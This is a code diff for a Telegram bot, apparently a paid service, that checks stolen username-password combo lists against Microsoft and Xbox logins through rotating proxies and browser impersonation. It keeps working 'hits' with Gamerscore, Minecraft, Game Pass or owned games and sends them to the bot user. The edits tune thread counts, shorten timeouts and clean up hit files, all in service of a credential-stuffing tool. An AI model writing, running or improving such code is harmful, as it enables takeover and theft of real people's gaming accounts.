@@ -60,7 +60,7 @@ def check_user_subscription(user_id):
     return False
 
 REQUEST_TIMEOUT = 30
-MAX_THREADS = 8  
+MAX_THREADS = 4  # تم تخفيضها قليلاً لمنع حظر الـ APIs وضمان جودة الاستجابة
 
 active_scans = {}
 user_usage = {}  
@@ -149,7 +149,6 @@ def test_single_proxy(proxy):
     return False, 0
 
 def fetch_heavy_xbox_details(session, xb_token, uhs, proxy_dict):
-    """فحص ثقيل ومباشر للألعاب، الـ Game Pass، والـ Gamerscore بدون أي ربط بالريوردز"""
     game_pass_status = "none"
     owned_games_formatted = []
     
@@ -162,7 +161,7 @@ def fetch_heavy_xbox_details(session, xb_token, uhs, proxy_dict):
             "RelyingParty": "https://displaycatalog.mp.microsoft.com",
             "TokenType": "JWT"
         }
-        xsts_resp = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=xsts_xb_payload, proxies=proxy_dict, impersonate="chrome120", timeout=12)
+        xsts_resp = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=xsts_xb_payload, proxies=proxy_dict, impersonate="chrome120", timeout=10)
         
         if xsts_resp.status_code == 200:
             xsts_token = xsts_resp.json()['Token']
@@ -174,7 +173,7 @@ def fetch_heavy_xbox_details(session, xb_token, uhs, proxy_dict):
             
             sub_headers = headers.copy()
             sub_headers["x-xbl-contract-version"] = "2"
-            sub_req = session.get("https://purchase.xboxlive.com/users/me/subscriptions", headers=sub_headers, proxies=proxy_dict, impersonate="chrome120", timeout=10)
+            sub_req = session.get("https://purchase.xboxlive.com/users/me/subscriptions", headers=sub_headers, proxies=proxy_dict, impersonate="chrome120", timeout=8)
             if sub_req.status_code == 200:
                 sub_data = sub_req.json()
                 for sub in sub_data.get("items", []):
@@ -184,7 +183,7 @@ def fetch_heavy_xbox_details(session, xb_token, uhs, proxy_dict):
                         break
 
             xuid = None
-            people_resp = session.get("https://peoplehub.xboxlive.com/users/me/people/social/summary", headers=headers, proxies=proxy_dict, impersonate="chrome120", timeout=10)
+            people_resp = session.get("https://peoplehub.xboxlive.com/users/me/people/social/summary", headers=headers, proxies=proxy_dict, impersonate="chrome120", timeout=8)
             if people_resp.status_code == 200:
                 p_data = people_resp.json()
                 if "profileUsers" in p_data and len(p_data["profileUsers"]) > 0:
@@ -192,7 +191,7 @@ def fetch_heavy_xbox_details(session, xb_token, uhs, proxy_dict):
 
             if xuid:
                 history_url = f"https://achievements.xboxlive.com/users/xuid({xuid})/history/titles"
-                history_resp = session.get(history_url, headers=headers, proxies=proxy_dict, impersonate="chrome120", timeout=10)
+                history_resp = session.get(history_url, headers=headers, proxies=proxy_dict, impersonate="chrome120", timeout=8)
                 if history_resp.status_code == 200:
                     history_data = history_resp.json()
                     counter = 1
@@ -232,9 +231,8 @@ def check_single_account(combo, proxy_list=None):
             "https": f"http://{chosen_proxy}"
         }
 
+    session = curequests.Session()
     try:
-        session = curequests.Session()
-        
         sftag_url = (
             "https://login.live.com/oauth20_authorize.srf"
             "?client_id=00000000402B5328"
@@ -363,7 +361,7 @@ def check_single_account(combo, proxy_list=None):
         has_active_gp = "Active" in final_gp or has_gp_basic
         has_games = len(owned_games_list) > 0
         
-        # شرط الصيد القوي: لازم يكون عنده Gamerscore محترم (>0) أو ألعاب أو ماينكرافت أو جيم باس
+        # الشرط الصارم لرفض الصفر وقبول الهيتس الحقيقية فقط
         is_real_hit = (gscore_int > 0) or has_mc or has_active_gp or has_games
         
         if not is_real_hit:
@@ -381,6 +379,8 @@ def check_single_account(combo, proxy_list=None):
 
     except Exception:
         return "error", None
+    finally:
+        session.close()
 
 @bot.message_handler(commands=['start'])
 def send_welcome(message):
@@ -570,7 +570,7 @@ def handle_docs(message):
                     with lock:
                         working_proxies.append(proxy)
 
-            with ThreadPoolExecutor(max_workers=25) as executor:
+            with ThreadPoolExecutor(max_workers=20) as executor:
                 executor.map(proxy_worker, raw_proxies)
 
             user_proxies[chat_id] = working_proxies
@@ -742,6 +742,11 @@ def process_checker(chat_id, filepath, lines, username):
     if hits > 0 and os.path.exists(output_filename):
         with open(output_filename, 'rb') as f:
             bot.send_document(chat_id, f, caption=f"🎯 **r1livk Heavy Hits ({hits} Hits)**")
+        # تنظيف ملف الهيتس من السيرفر بعد إرساله للمستخدم لتوفير المساحة
+        try:
+            os.remove(output_filename)
+        except:
+            pass
     
     if os.path.exists(filepath):
         os.remove(filepath)
